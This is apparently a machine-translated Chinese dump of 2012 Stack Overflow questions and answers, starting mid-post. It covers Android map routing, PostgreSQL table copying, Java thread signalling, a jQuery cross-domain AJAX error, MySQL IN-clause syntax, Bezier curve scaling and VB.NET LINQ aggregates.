    overlayitem1 = new OverlayItem(geoPoint1, "Your Location2", "I am ur client!");
    itemizedOverlay1.addOverlay(overlayitem1);              
    mapOverlays.add(itemizedOverlay1);
    itemizedOverlay1.populateNow();
    // Map near overlay item    
    itemizedOverlay = new AddItemizedOverlay(drawable, this);

    mc = mapView.getController();

    // These values are used to get map boundary area
    // The area where you can see all the markers on screen
    int minLat = Integer.MAX_VALUE;
    int minLong = Integer.MAX_VALUE;
    int maxLat = Integer.MIN_VALUE;
    int maxLong = Integer.MIN_VALUE;

    // check for null in case it is null
    if (nearPlaces.results != null) {
        // loop through all the places
        for (Place place : nearPlaces.results) {
            latitude = place.geometry.location.lat; // latitude
            longitude = place.geometry.location.lng; // longitude

            // Geopoint to place on map
            geoPoin = new GeoPoint((int) (latitude * 1E6),
                    (int) (longitude * 1E6));

            // Map overlay item
            overlayitem = new OverlayItem(geoPoin, place.name,
                    place.vicinity);

            itemizedOverlay.addOverlay(overlayitem);

            // calculating map boundary area
            minLat  = (int) Math.min( geoPoin.getLatitudeE6(), minLat );
            minLong = (int) Math.min( geoPoin.getLongitudeE6(), minLong);
            maxLat  = (int) Math.max( geoPoin.getLatitudeE6(), maxLat );
            maxLong = (int) Math.max( geoPoin.getLongitudeE6(), maxLong );
        }
        mapOverlays.add(itemizedOverlay);

        // showing all overlay items
        itemizedOverlay.populateNow();
    }

    DrawPath(geoPoint, geoPoint1, geopointsearch, Color.GREEN, mapView);

    // Adjusting the zoom level so that you can see all the markers on map
    mapView.getController().zoomToSpan(Math.abs( minLat - maxLat ), Math.abs( minLong - maxLong ));

    // Showing the center of the map
    mc.animateTo(new GeoPoint((maxLat + minLat)/2, (maxLong + minLong)/2 ));
    mc.animateTo(geoPoint1);

    mapView.postInvalidate();

}   

private void DrawPath(GeoPoint scrgeoPoint, GeoPoint destgeoPoint, GeoPoint destgeopointsearch, int green, MapView mMapView) {
     HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(makeUrl(scrgeoPoint, destgeoPoint, destgeopointsearch));
        HttpResponse response;
        try {
            response = httpclient.execute(httppost);

            HttpEntity entity = response.getEntity();
            InputStream is = null;
            is = entity.getContent();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "iso-8859-1"), 8);
            StringBuilder sb = new StringBuilder();
            sb.append(reader.readLine() + "\n");
            String line = "0";
            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }
            is.close();
            reader.close();
            String result = sb.toString();
            JSONObject jsonObject = new JSONObject(result);
            JSONArray routeArray = jsonObject.getJSONArray("routes");
            JSONObject routes = routeArray.getJSONObject(0);

            // calculate the distance between 2 point
            JSONArray legs = routes.getJSONArray("legs");
            Log.d("JSON","legs: "+legs.toString());
            JSONObject steps = legs.getJSONObject(0);
           Log.d("JSON","steps: "+steps.toString());
            JSONObject distance = steps.getJSONObject("distance");
            Log.d("JSON","distance: "+distance.toString());
            String sDistance = distance.getString("text");
            int iDistance = distance.getInt("value");                           
            distextView = (TextView) findViewById(R.id.distextView); 
            distextView.setText(distance.getString("text"));

            JSONObject overviewPolylines = routes.getJSONObject("overview_polyline");
            String encodedString = overviewPolylines.getString("points");
            List<GeoPoint> pointToDraw = decodePoly(encodedString);
            mMapView.getOverlays().add(new MyOverLay(pointToDraw));

            } catch (ClientProtocolException e) {            
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

private List<GeoPoint> decodePoly(String encoded) {
     List<GeoPoint> poly = new ArrayList<GeoPoint>();
        int index = 0, len = encoded.length();
        int lat = 0, lng = 0;

        while (index < len) {
            int b, shift = 0, result = 0;
            do {
                b = encoded.charAt(index++) - 63;
                result |= (b & 0x1f) << shift;
                shift += 5;
            } while (b >= 0x20);
            int dlat = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
            lat += dlat;

            shift = 0;
            result = 0;
            do {
                b = encoded.charAt(index++) - 63;
                result |= (b & 0x1f) << shift;
                shift += 5;
            } while (b >= 0x20);
            int dlng = ((result & 1) != 0 ? ~(result >> 1) : (result >> 1));
            lng += dlng;

            GeoPoint p = new GeoPoint((int) (((double) lat / 1E5) * 1E6),
                    (int) (((double) lng / 1E5) * 1E6));
            poly.add(p);
        }
        return poly;
    }

private String makeUrl(GeoPoint scrgeoPoint, GeoPoint destgeoPoint, GeoPoint destgeopointsearch) {
    StringBuilder urlString = new StringBuilder();

    //Origin
    urlString.append("http://maps.googleapis.com/maps/api/directions/json");
    urlString.append("?origin=");// from
    urlString.append(Double.toString((double) scrgeoPoint.getLatitudeE6() / 1.0E6));
    urlString.append(",");
    urlString.append(Double.toString((double) scrgeoPoint.getLongitudeE6() / 1.0E6));
    //Destination
    urlString.append("&destination=");// to
    urlString.append(Double.toString((double) destgeoPoint.getLatitudeE6() / 1.0E6));
    urlString.append(",");
    urlString.append(Double.toString((double) destgeoPoint.getLongitudeE6() / 1.0E6));
    //search location
    urlString.append("&destination=");// to
    urlString.append(Double.toString((double) destgeopointsearch.getLatitudeE6() / 1.0E6));
    urlString.append(",");
    urlString.append(Double.toString((double) destgeopointsearch.getLongitudeE6() / 1.0E6));

    urlString.append("&mode=walking&sensor=true");             
    Log.d("xxx", "URL=" + urlString.toString());
    return urlString.toString();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T10:55:19.783

据我了解，您需要保存您的位置和目的地，然后向 Google 询问路线，可能是这样的：

```
Intent intent = new Intent(android.content.Intent.ACTION_VIEW, 
Uri.parse("http://maps.google.com/maps?saddr=20.344,34.34&daddr=20.5666,45.345"));
startActivity(intent); 
```

（取自[这篇](https://stackoverflow.com/questions/2662531/launching-google-maps-directions-via-an-intent-on-android)文章。）

然后，您需要在许多点之间绘制一条线/路径（从 Google 接收），以便在不穿过建筑物和角落的情况下实现路径。也许这段代码对你有启发：

```
private List<Overlay> mapOverlays;

private Projection projection;  

@Override
public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.main);

linearLayout = (LinearLayout) findViewById(R.id.zoomview);
mapView = (MapView) findViewById(R.id.mapview);
mapView.setBuiltInZoomControls(true);

mapOverlays = mapView.getOverlays();        
projection = mapView.getProjection();
mapOverlays.add(new MyOverlay());        

}

@Override
protected boolean isRouteDisplayed() {
return false;
}

class MyOverlay extends Overlay{

public MyOverlay(){

}   

public void draw(Canvas canvas, MapView mapv, boolean shadow){
    super.draw(canvas, mapv, shadow);

    Paint   mPaint = new Paint();
    mPaint.setDither(true);
    mPaint.setColor(Color.RED);
    mPaint.setStyle(Paint.Style.FILL_AND_STROKE);
    mPaint.setStrokeJoin(Paint.Join.ROUND);
    mPaint.setStrokeCap(Paint.Cap.ROUND);
    mPaint.setStrokeWidth(2);

    GeoPoint gP1 = new GeoPoint(19240000,-99120000);
    GeoPoint gP2 = new GeoPoint(37423157, -122085008);

    Point p1 = new Point();
    Point p2 = new Point();
    Path path = new Path();

    projection.toPixels(gP1, p1);
    projection.toPixels(gP2, p2);

    path.moveTo(p2.x, p2.y);
    path.lineTo(p1.x,p1.y);

    canvas.drawPath(path, mPaint);
} 
```

（取自[这篇](https://stackoverflow.com/questions/2176397/drawing-a-line-path-on-google-maps)文章。）

# sql - 如何复制表格的结构和内容，但顺序不同？

> ID：12264719
> 
> 赞同：12
> 
> 时间：2012-09-04T13:38:03.960
> 
> 标签：sql, postgresql, temp-tables, create-table

我正在尝试为单元测试目的设置临时表。到目前为止，我设法创建了一个临时表来复制现有表的结构：

```
CREATE TEMP TABLE t_mytable (LIKE mytable INCLUDING DEFAULTS); 
```

但这缺少原始表中的数据。`CREATE TABLE AS`我可以改为使用语句将数据复制到临时表中：

```
CREATE TEMP TABLE t_mytable AS SELECT * FROM mytable; 
```

但随后的结构`t_mytable`将不相同，例如列大小和默认值不同。是否有一条语句可以复制所有内容？

第一个查询使用的另一个问题`LIKE`是键列仍然引用`SEQUENCE`原始表的，因此在插入时将其递增。有没有一种简单的方法可以用自己的序列创建新表，还是我必须手动设置一个新序列？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-09-04T17:51:47.343

我正在使用以下代码来做到这一点：

```
CREATE TABLE t_mytable (LIKE mytable INCLUDING ALL);
ALTER TABLE t_mytable ALTER id DROP DEFAULT;
CREATE SEQUENCE t_mytable_id_seq;
INSERT INTO t_mytable SELECT * FROM mytable;
SELECT setval('t_mytable_id_seq', (SELECT max(id) FROM t_mytable), true);
ALTER TABLE t_mytable ALTER id SET DEFAULT nextval('t_my_table_id_seq');
ALTER SEQUENCE t_mytable_id_seq OWNED BY t_mytable.id; 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-04T14:07:17.963

### Postgres 10 或更高版本

Postgres 10 引入了符合 SQL 标准的[**`IDENTITY`**列（带有少量扩展）。](https://blog.2ndquadrant.com/postgresql-10-identity-columns/)您的表的 ID 列将类似于：

```
id    integer PRIMARY KEY GENERATED BY DEFAULT AS IDENTITY 
```

[手册中的语法。](https://www.postgresql.org/docs/current/sql-createtable.html)
使用它而不是传统的[`serial`](https://www.postgresql.org/docs/current/datatype-numeric.html#DATATYPE-SERIAL)列可以避免序列问题。`IDENTITY`列自动使用独占的专用序列，即使使用 . 复制规范也是如此`LIKE`。[手册：](https://www.postgresql.org/docs/current/sql-createtable.html#idm46046852799376)

> 复制的列定义的任何标识规范只有在指定时才会被复制`INCLUDING IDENTITY`。为新表的每个标识列创建一个新序列，与与旧表关联的序列分开。

和：

> `INCLUDING ALL`是 的缩写形式`INCLUDING DEFAULTS INCLUDING IDENTITY INCLUDING CONSTRAINTS INCLUDING INDEXES INCLUDING STORAGE INCLUDING COMMENTS`。

现在**解决方案**更简单：

```
CREATE TEMP TABLE t_mytable (LIKE mytable INCLUDING ALL);
INSERT INTO t_mytable TABLE mytable;
SELECT setval(pg_get_serial_sequence('t_mytable', 'id'), max(id)) FROM tbl; 
```

如图所示，您仍然可以使用[`setval()`](https://www.postgresql.org/docs/current/functions-sequence.html)来设置序列的当前值。一个人`SELECT`就可以了。`pg_get_serial_sequence()`] [6](https://www.postgresql.org/docs/current/functions-info.html#FUNCTIONS-INFO-CATALOG-TABLE)获取序列的名称。

*db<>[在这里摆弄](http://dbfiddle.uk/?rdbms=postgres_10&fiddle=6150931ea0b7392f65fc7793037c885a)*

有关的：

*   [不同步时如何重置postgres的主键序列？](https://stackoverflow.com/questions/244243/how-to-reset-postgres-primary-key-sequence-when-it-falls-out-of-sync/23390399#23390399)
*   [SELECT * FROM 有快捷方式吗？](https://stackoverflow.com/questions/30275979/is-there-a-shortcut-for-select-from/30276023#30276023)
*   [为字段创建 PostgreSQL 序列（不是记录的 ID）](https://stackoverflow.com/questions/24657693/creating-a-postgresql-sequence-to-a-field-which-is-not-the-id-of-the-record/24659884#24659884)

* * *

### 原始（旧）答案

您可以从数据库转储或[pgAdmin](https://www.pgadmin.org/)之类的 GUI （它对数据库对象创建脚本进行逆向工程）获取创建脚本，创建一个相同的副本（`serial`列具有单独的序列），然后运行：

```
INSERT INTO new_tbl
SELECT * FROM old_tbl; 
```

如果两个表位于同一架构中，则副本不能 100% 相同。显然，表名必须不同。索引名称也会发生冲突。从同一序列中检索序列号也可能不符合您的最佳利益。所以你必须（至少）调整名字。

将副本放在不同的模式中可以避免所有这些冲突。当您像演示的那样从*常规*表创建*临时*表时，情况会自动发生，因为临时表驻留在它们自己的临时模式中。

 *或者查看[Francisco](https://stackoverflow.com/a/18620623/939860)对直接复制DDL代码的答案。*

# php - 如何在php中获取节点的子节点？

> ID：12264721
> 
> 赞同：0
> 
> 时间：2012-09-04T13:38:05.843
> 
> 标签：php, curl

我需要获取我访问过的特定节点的子节点（带有 class = title 的 li 节点）

请帮帮我，我该怎么做？

```
 <?php
    $options = array(
    CURLOPT_RETURNTRANSFER => true,     // return web page
    CURLOPT_HEADER         => false,    // don't return headers
    CURLOPT_FOLLOWLOCATION => true,     // follow redirects
    CURLOPT_ENCODING       => "",       // handle all encodings
    CURLOPT_USERAGENT      => "SomeUcam v0.1 Bot", // who am i
    CURLOPT_AUTOREFERER    => true,     // set referer on redirect
    CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
    CURLOPT_TIMEOUT        => 120,      // timeout on response
    CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
       );

        $ch      = curl_init( "http://example.com/?page=1" );
       curl_setopt_array( $ch, $options );
       $content = curl_exec( $ch );
       $err     = curl_errno( $ch );
       $errmsg  = curl_error( $ch );
       $header  = curl_getinfo( $ch );
       curl_close( $ch );

    $newDom = new domDocument;
    $newDom->loadHTML($content);

    $finder = new DomXPath($newDom);
    $classname="title";
    $nodes = $finder->query("//*[contains(@class, '$classname')]");
    $nodesNo = $nodes->length;
    echo $nodesNo;

    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T16:36:37.310

`foreach`例如，您可以使用-loop遍历节点：

```
$url = 'http://example.com/';

/* this is necessary to prevent DOMDocument errors on HTML5-elements */
libxml_use_internal_errors( true );

$dom = new DOMDocument();
$dom->loadHTMLFile( $url );
$finder = new DOMXpath( $dom );
$nodes = $finder->query( "//*[contains(@class, 'title')]" );

if( $nodes instanceof DOMNodeList )
{
    foreach( $nodes as $node )
    {
        var_dump( $node->nodeName, $node->nodeValue );
    }
} 
```

# java - 对使用什么模式有条件地阻塞线程感到困惑

> ID：12264725
> 
> 赞同：2
> 
> 时间：2012-09-04T13:38:13.113
> 
> 标签：java, concurrency

我有一个`Map`可以`null`在应用程序首次启动时清除或简单清除的对象。我需要所有访问此映射的线程阻塞，直到映射初始化，然后我才需要向所有线程发出信号以访问此映射。

`Synchronized`此映射包含配置数据，除非单个线程决定刷新以加载新的配置数据，否则它将仅用于读取（因此，出于性能考虑，它不需要，因为我也认为没有必要）。我尝试将`Condition`对象用于 a`ReentrantLock`但`IllegalMonitorState`每当我尝试`signalAll()`或时它都会引发异常`await()`。

这是我需要做的伪代码：

```
void monitorThread{
    while(someCondition){
        map = updatedMap();
        condition.signalAll();
    }
}

String readValueFromMap(String key){
    if(map == null){
        condition.await();
    }
    return map.get(key);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:40:40.703

`CountDownLatch`是你所需要的全部。

```
CountDownLatch latch = new CountDownLatch(1); 
```

虽然初始化 hashmap`latch.countdown()`并在线程中使用`latch.await()`

```
void monitorThread{
    map = updatedMap();
    latch.countDown();
}

String readValueFromMap(String key){
    latch.await();
    return map.get(key);
} 
```

请注意，CountDownLatch`await()`方法仅在倒计时大于 0 时才等待，因此只有第一次。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T13:51:56.557

要做到这一点，您需要一个内存屏障，因此`volatile`. 由于地图最初可能为空，因此您将需要另一个锁定对象。以下应该有效：

```
private final Object lockObject = new Object();
private volatile Map<...> map;

void monitorThread{
    while (condition){
        // do this outside of the synchronized in case it takes a while
        Map<...> updatedMap = updatedMap();
        synchronized (lockObject) {
           map = updatedMap;
           // notify everyone that may be waiting for the map to be initialized
           lockObject.notifyAll();
        }
    }
}

String readValueFromMap(String key) {
    // we grab a copy of the map to avoid race conditions in case the map is
    // updated in the future
    Map<...> mapRef = map;
    // we have a while loop here to handle spurious signals
    if (mapRef == null) {
        synchronized (lockObject) {
           while (map == null) {
               // wait for the map to initialized
               lockObject.wait();
           }
           mapRef = map;
        }
    }
    return mapRef.get(key);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:53:50.973

听起来您只需要一个“锁定”对象来保护对地图的访问。

这些非常容易使用：

```
 Lock l = ...;
 l.lock();
 try {
     // access the resource protected by this lock
 } finally {
     l.unlock();
 } 
```

您可能会使用：java.util.concurrent.locks.ReentrantReadWriteLock.ReadLock

# java - 在 Hibernate (HQL) 中删除两个表之间的关系

> ID：12264729
> 
> 赞同：0
> 
> 时间：2012-09-04T13:38:23.100
> 
> 标签：java, hibernate, servlets, hql

我有两个表（资源和标签），第三个连接它们（Resources_tags）。如何使用 HQL 查询删除具有多个标签的资源的多对多关系？例如，我想删除资源在 Resources_tags 表中的所有标签。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:47:22.923

如果您的两个表是“A”和“B”，那么当您设置两个表时，您需要在表“A”上指定“级联”。

像这样：

```
<bag name="A"
  inverse="true"
  lazy="false"
  cascade="all">
  <key column="SOME_ID"/>
  ..... 
```

现在对“A”执行的任何删除都应该具有预期的效果。

# javascript - 通过 JavaScript/JQuery 下载 JSON 文件 - HTTP 状态正常 - JQuery 错误

> ID：12264733
> 
> 赞同：0
> 
> 时间：2012-09-04T13:38:40.903
> 
> 标签：javascript, jquery, ajax, json, download

我遇到了以下问题：我需要从一个via **JQuery / JavaScript**`JSON`下载一个文件。从理论上讲，这应该是非常基本的。`API`

 **我试过`$.ajax`了，它的所有兄弟姐妹都喜欢`$.get`or `$.getJSON`。我总是得到*200 OK*但我的 Firebug 报告错误。打印错误只是说：“错误” - 所以没有那么有帮助。

我读到可能 JSON 文件已损坏。所以我尝试了一个纯文本文件（*.txt）。结果相同。

JSON 文件有效，我通过验证器对其进行检查。

我也尝试过`ContentType`并`dateType`尝试过`json`...`jsonp`

我基本上使用了这样的东西（有一百万种变化用于测试目的）：

```
$.ajax({
   url: 'http://www.myurl.com/api/v1/myfile.json',
   ...
   success: function(data) {
      console.log(data);
    },
   error: function(error) {
     console.log(error.statusText);
   }
}); 
```

我在这里错过了一些重要的事情吗？似乎没有任何东西可以改变 AJAX 调用的行为，这真的很奇怪。

事实上，我并不真的需要 AJAX，因为我需要在加载页面时抓取 JSON 文件......

并且 JSON 文件与 AJAX 调用者不在同一个域中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:49:39.077

该 URL 是否位于您尝试从中获取数据的**同一台服务器上？**

如果没有，您遇到了跨域请求，只能使用 JSONP 处理。因此，JSON 文件本身必须与 JSONP 格式兼容，否则 jQuery 将无法处理它（即使您提供了 'jsonp' 数据类型）。

PS：Firebug 将始终显示响应代码 200，但为此类请求提供空响应正文

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:32:00.233

通过禁用安全性尝试以这种方式

```
$.ajax( {
        type : 'GET',
        contentType : "application/json; charset=utf-8",
        url : surl,  \\specify  your url
        async : false,
        dataType : 'json',
        headers : {
            Accept : "application/json",
            "Access-Control-Allow-Origin" : "*"
        },
        crossDomain : true,
        success : SucceedFunc,
        error : function(data, textStatus, errorThrown) {
            console.log("error" + ' ' + JSON.stringify(data) + ' ' + textStatus + '  ' + errorThrown);
        }
    });
function SucceedFunc(data) {
               alert("success");
                   }

    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:52:49.223

您是否尝试以正确的方式捕捉错误？

```
$.ajax({
    url: 'http://www.myurl.com/api/v1/myfile.json',
    success: function(data) {
         console.log(data);
    },
    error: function(error) {
         console.log(error.message);
    }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-04T14:24:51.953

如果您使用的是 chrome，请转到 cmd 提示符并通过禁用安全性来运行 chrome。您可以使用 pathwhere_chrome_is_located\chrome.exe --disable-web-security 禁用安全性并运行 html 页面。我想这可能会对你有所帮助。**

# php - 连接表（SQL 语法错误）

> ID：12264734
> 
> 赞同：0
> 
> 时间：2012-09-04T13:38:41.600
> 
> 标签：php

我想知道是否有人可以帮助我发现错误。我对加入表格很陌生，但我在最后一点做得很好。

**您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 9 行的 ''(10,8)' AND d.streamitem_target IN '(10,8)') ORDER BY d.streamitem_id DE' 附近使用正确的语法**

```
$call="SELECT d.*, c.*, u.*
  FROM streamdata          AS d
  JOIN streamdata_comments AS c ON d.streamitem_id = c.comment_streamitem
  JOIN users               AS u ON u.id = c.comment_poster
 WHERE c.comment_poster = '$following_string'
   AND d.streamitem_id < '$lastID'
   AND (d.streamitem_target  = '$following_string' OR
       d.streamitem_creator = '$following_string')
   OR  d.streamitem_creator IN '$friendlist' 
   AND d.streamitem_target IN '$friendlist'
   ORDER BY d.streamitem_id DESC LIMIT 10"; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:41:33.253

```
OR  d.streamitem_creator IN '$friendlist' 
```

应该

```
 OR  d.streamitem_creator IN $friendlist 
```

您不引用`IN`变量。

这同样适用于`AND d.streamitem_target IN '$friendlist'`线路。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:42:43.073

我认为 IN 子句中 $friendlist 周围的单引号可能是您的问题，例如，更改为

```
 OR  d.streamitem_creator IN $friendlist 
   AND d.streamitem_target IN $friendlist 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:42:40.040

您将逗号分隔的列表括在引号中。不要那样做。

```
.
.
.
OR  d.streamitem_creator IN $friendlist
AND d.streamitem_target IN $friendlist
.
.
. 
```

# .net - 有没有办法在delphi prism中加载库？

> ID：12264738
> 
> 赞同：0
> 
> 时间：2012-09-04T13:38:54.677
> 
> 标签：.net, dll, delphi-prism

我需要在运行时加载动态链接或静态库文件。有没有办法在德尔福棱镜中做到这一点？

MSDN 库似乎没有表明这一点。

任何帮助或提示将不胜感激。

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:47:43.067

您可以使用该[`Assembly.LoadFrom`](http://msdn.microsoft.com/en-us/library/system.reflection.assembly.loadfrom.aspx)方法加载程序集。从这里您可以使用[反射](http://msdn.microsoft.com/en-us/library/136wx94f)来调用库的公共方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T13:25:21.053

您的问题没有提供更多关于您的请求性质的上下文，但是如果您出于插件类型可扩展性的原因而希望加载程序集，那么我建议您使用像[MEF](http://mef.codeplex.com/)（托管可扩展性框架）这样的库。[这里有一篇关于在Delphi Prism](http://jamiei.com/blog/2010/09/flying-with-mef-in-delphi-prism/)中使用 MEF 的简短文章，但它允许您定义接口并以多种不同方式使用您的程序集：

首先你应该定义你的接口：

```
PluginList = class
public
  [ImportMany(typeof(IFileAction))]
  property FileActions: IList<IFileAction> read write;
  constructor;
end; 
```

然后，您可以通过多种不同方式加载任意数量的程序集进行扩展：

```
var aggregateCat := new AggregateCatalog();
var catalogThisAssembly := new AssemblyCatalog(System.Reflection.Assembly.GetExecutingAssembly());
var catalogIndividual := new AssemblyCatalog('plugins\MyHelloPlugin.dll');
var dirCatalog := new DirectoryCatalog('plugins');

// Add our Catalogs here,
aggregateCat.Catalogs.Add(dirCatalog);

var container := new CompositionContainer(aggregateCat);
// Create our plugin hosting object
var pluginList := new PluginList();
// Compose the parts.
container.ComposeParts(pluginList); 
```

然后，您有一个已加载程序集的列表，您可以在其上执行您的操作：

```
for each plugin: IFileAction in pluginList.FileActions do
begin
  Console.WriteLine('Loaded ' + plugin.Name + ', version ' + plugin.Version);
end; 
```

# jquery - 在 Jquery 中构建 CheckBox 的 Id

> ID：12264739
> 
> 赞同：0
> 
> 时间：2012-09-04T13:39:18.203
> 
> 标签：jquery

我有一个下拉列表：

```
 @Html.DropDownList("name", (IEnumerable<SelectListItem>)SlotList[counter], new { id = "slotDDL_" + @item.ResourceID, tid = @item.ResourceID, @class = "slotDDL_ text white" }) 
```

和一个复选框：

```
@Html.CheckBoxFor(modelItem => item.IsSelected, new { @class = "boxcheck_", id = @item.ResourceID }) 
```

执行此操作时：

```
 $('.slotDDL_').change(function () {
            var resId = $(this).attr("tid");
            IsSelected = 'boxcheck_' + resId;
            alert($('#' + resId).attr("checked"));
      }); 
```

我得到以下信息：

```
alert($(this).attr("tid"))====>505
alert(IsSelected)====> boxcheck_505
alert($('#' + resId).attr("checked"))===>undefined 
```

**问题：** 如何成功构建我的 Id 字符串？我究竟做错了什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:55:15.773

尝试

```
@Html.CheckBoxFor(modelItem => item.IsSelected, new { @class = "boxcheck_", id = "@item.ResourceID" }) 
```

你错过`"`了`id`属性

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:42:19.370

用“#”代替“。”

```
$('#slotDDL_') 
```

# ios - 按比例缩放贝塞尔曲线 - 计算控制点

> ID：12264741
> 
> 赞同：1
> 
> 时间：2012-09-04T13:39:19.610
> 
> 标签：ios, core-graphics, shapes

我正在尝试采用贝塞尔曲线（Core Graphics 中的任意曲线）并在给定另外两个端点的情况下按比例缩小（或扩展）它。我有一种可行的方法，但它最终会“拉平”曲线，而不是完全保持形状。也许我搞砸了代码或逻辑，但我有两个原始点以及控制点。给定另一组端点，我想计算适当的控制点以在新端点之间产生相同的形状。

这是计算 1 个控制点的主要代码：

```
CGPoint (^ScaledCtrlPoint)(CGPoint, CGPoint, CGPoint, CGPoint, CGPoint) = ^CGPoint (CGPoint refPoint1, CGPoint refPoint2, CGPoint bevPoint1, CGPoint bevPoint2, CGPoint ctrlPoint){
        //Normalize points to refPoint1
        refPoint2.x -= refPoint1.x; refPoint2.y -= refPoint1.y;
        ctrlPoint.x -= refPoint1.x; ctrlPoint.y -= refPoint1.y;
        //Normalize bevPoints to bevPoint1
        bevPoint2.x -= bevPoint1.x; bevPoint2.y -= bevPoint1.y;
        //Calculate control point angle
        CGFloat theta = PointTheta(refPoint2);
        CGFloat refHyp = (refPoint2.y != 0.0f) ? refPoint2.y / sinf(theta) : refPoint2.x / cosf(theta);
        theta = PointTheta(bevPoint2);
        CGFloat bevHyp = (bevPoint2.y != 0.0f) ? bevPoint2.y / sinf(theta) : bevPoint2.x / cosf(theta);
        theta = PointTheta(ctrlPoint);
        CGFloat ctrlHyp = (ctrlPoint.y != 0.0f) ? ctrlPoint.y / sinf(theta) : ctrlPoint.x / cosf(theta);
        ctrlHyp *= (bevHyp / refHyp);
        return CGPointMake(bevPoint1.x + cosf(theta) * ctrlHyp, bevPoint1.y + sinf(theta) * ctrlHyp);
    }; 
```

这些`bevPoints`是我用来计算新控制点的新点。`refPoints`和`ctrlPoint`是贝塞尔曲线的原点。如您所见，我正在尝试按与原始端点与新端点相同的比例缩小 ctrlPoint（也可以放大）。

我还使用了另一个函数，用于计算入射角。这很简单：

```
CGFloat         PointTheta(CGPoint point){
    //This assumes an origin of {0, 0} and returns a theta for the given point
    CGFloat theta = atanf(point.y / point.x);
    //Using arc tan requires some adjustment depending on the point quadrant
    if (point.x == 0.0f) theta = (point.y >= 0.0f) ? M_PI_2 : M_PI + M_PI_2;
    else if (point.x < 0.0f) theta += M_PI;
    else if (point.x > 0.0f && point.y < 0.0f) theta += (M_PI * 2);
    return theta;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:19:02.973

我会`CGAffineTransform`用参数计算

```
(a, b, -b, a, tx, ty) 
```

（即没有倾斜的变换）将旧端点映射到新端点，然后将此变换应用于旧控制点以获得新控制点。

将 2 个旧端点映射到 2 个新端点的条件给出了 a、b、tx、ty 的 4 个方程，这些方程甚至可以在没有三角函数的情况下求解。

# vb.net - Aggregate 是否存在致命缺陷，因为每个 into 子句都是单独执行的？

> ID：12264751
> 
> 赞同：12
> 
> 时间：2012-09-04T13:39:56.580
> 
> 标签：.net, vb.net, vb.net, linq, linq-to-sql, aggregate-functions, aggregate

*`Aggregate`当用作具有多个子句的 Linq 表达式的第一个（外部）子句时，VB.NET 的查询是否存在致命缺陷，`Into`因为每个`Into`子句都是单独执行的？*

[`SELECT MIN(ZoneMin), MAX(ZoneMin) FROM Plant`LINQ to SQL](https://stackoverflow.com/q/4672239/256431)中的“明显”答案是

```
Dim limits = Aggregate p In Plants Select p.ZoneMin Into Min(), Max() 
```

但是，此答案实际上检索了*单独*的SQL 查询中的每个`Min`and `Max`（如果您包括其他聚合函数，如`Count`and `Average`） 。这在 LINQPad 中很容易看到。

 *是否存在 LINQPad 未显示的事务（或其他使这些查询原子化的事物），或者这是等待发生的竞争条件？（因此，您必须执行上述问题的答案中显示的技巧，以强制执行返回多个聚合的单个查询。）

总之，是否有使用`Aggregate`在单个（或至少“原子”）查询中返回多个聚合函数的 LINQ-to-SQL 查询？

[（我也说“显而易见”，因为对我来说显而易见的答案`Aggregate p In Plants Into Min(p.ZoneMin), Max(p.ZoneMin)`实际上是两次检索整个表，即使在优化时也是如此，然后使用 Linq-to-Entities`Min`并`Max`获得结果:-()]

[我认为`Aggregate`不是 VB 特定的，但看起来 C# 没有这个查询表达式，所以我将[.net](/questions/tagged/.net "显示标记为“.net”的问题")更改为[vb.net](/questions/tagged/vb.net "显示标记为“vb.net”的问题")。]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:46:49.633

尽管它不使用 Aggregate 关键字，但您可以使用以下语法在单个查询中执行多个功能：

```
Dim query = From book In books _
    Group By key = book.Subject Into Group _
    Select id = key, _
        BookCount = Group.Count, _
        TotalPrice = Group.Sum(Function(_book) _book.Price), _
        LowPrice = Group.Min(Function(_book) _book.Price), _
        HighPrice = Group.Max(Function(_book) _book.Price), _
        AveragePrice = Group.Average(Function(_book) _book.Price) 
```

不过，Aggregate 子句的实现似乎确实存在问题。考虑来自 Northwind 的以下查询：

```
Aggregate o in Orders
into Sum(o.Freight),
Average(o.Freight),
Max(o.Freight) 
```

这会发出 3 个数据库请求。前两个执行单独的聚合子句。第三个将整个表拉回客户端，并通过 Linq to Objects 在客户端执行 Max。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-05T13:06:56.110

回答我更广泛的问题：在`Aggregate`没有事务的情况下生成单独的 SQL 查询被破坏了吗？

